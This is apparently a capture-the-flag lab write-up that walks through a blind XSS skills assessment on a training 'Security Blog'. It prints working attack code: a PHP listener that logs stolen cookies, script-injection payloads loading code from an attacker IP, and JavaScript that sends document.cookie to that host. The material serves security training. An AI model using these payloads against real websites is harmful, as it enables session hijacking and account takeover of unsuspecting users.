# Skills Assessment

We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag

### Step 1: Identify a vulnerable user-input field

For this assessment, the vulnerable user-input field is accessible when clicking in "Welcome to Security Blog".

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-13 22-16-35 (1).png" alt=""><figcaption></figcaption></figure>

This XSS vulnerability is a Blind-XSS, in order to create a proof of concept, we must create a temporary helper file to receive a connection.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['TARGET_IP']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Then we start the server with `sudo php -S 0.0.0.0:80`.

### Step 2: Find a working XSS payload&#x20;

The vulnerable payload found is:

```html
"><script src=http://10.10.14.32/website></script>
```

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-13 22-26-21.png" alt=""><figcaption></figcaption></figure>

And we received a 200 Response from our payload!

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-13 22-28-14.png" alt=""><figcaption></figcaption></figure>

### Step 3: Steal the victim's cookies

Now we must find a way to still the cookie

Let's create another payload. First we create a a file with the command nano script.js, and then we add the following:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie
```

And we fill the comment section again. But this time we point our script to our file:

```html
"><script src=http://10.10.14.32/script.js></script>
```

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-13 22-34-01.png" alt=""><figcaption></figcaption></figure>

And when we check the logs, we can see we got a session cookie, and subsequently our flag!

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-13 22-43-42edited (1).png" alt=""><figcaption></figcaption></figure>
